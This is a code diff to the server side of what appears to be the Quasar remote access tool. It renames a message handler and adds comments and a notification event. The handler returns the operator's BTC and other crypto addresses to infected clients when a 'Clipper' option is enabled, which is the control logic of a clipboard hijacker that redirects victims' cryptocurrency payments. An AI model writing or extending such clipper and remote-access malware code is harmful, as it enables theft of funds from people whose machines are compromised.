@@ -15,23 +15,23 @@ using System.Windows.Forms;
 
 namespace Quasar.Server.Messages
 {
+    // I literally copied all of this from another handler and shoved it in here
+
     /// <summary>
     /// Handles messages for the interaction with the remote client status.
     /// </summary>
-    public class GetCryptoAddress : MessageProcessorBase<object>
+    public class GetCryptoAddressHandler : MessageProcessorBase<object>
     {
         public delegate void AddressReceivedEventHandler(object sender, Client client, string addressType);
 
         public event AddressReceivedEventHandler AddressReceived;
 
         /// <summary>
-        /// Initializes a new instance of the <see cref="GetCryptoAddress"/> class.
+        /// Initializes a new instance of the <see cref="GetCryptoAddressHandler"/> class.
         /// </summary>
-        public GetCryptoAddress() : base(true)
+        public GetCryptoAddressHandler() : base(true)
         {
         }
-
-
 
         /// <inheritdoc />
         public override bool CanExecute(IMessage message) => message is DoGetAddress;
@@ -55,6 +55,8 @@ namespace Quasar.Server.Messages
             FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
             if (frm != null && frm.ClipperCheckbox.Checked)
             {
+                // get the address and send it back 
+
                 var addressGetters = new Dictionary<string, Func<string>>
                 {
                     { "BTC", frm.GetBTCAddress },
@@ -75,6 +77,8 @@ namespace Quasar.Server.Messages
                         Address = getAddress()
                     });
                 }
+                //notification centre.
+                FrmMain.AddNotiEvent(frm, client.Value.UserAtPc, "Requested crypto address", message.Type);
             }
         }
     }
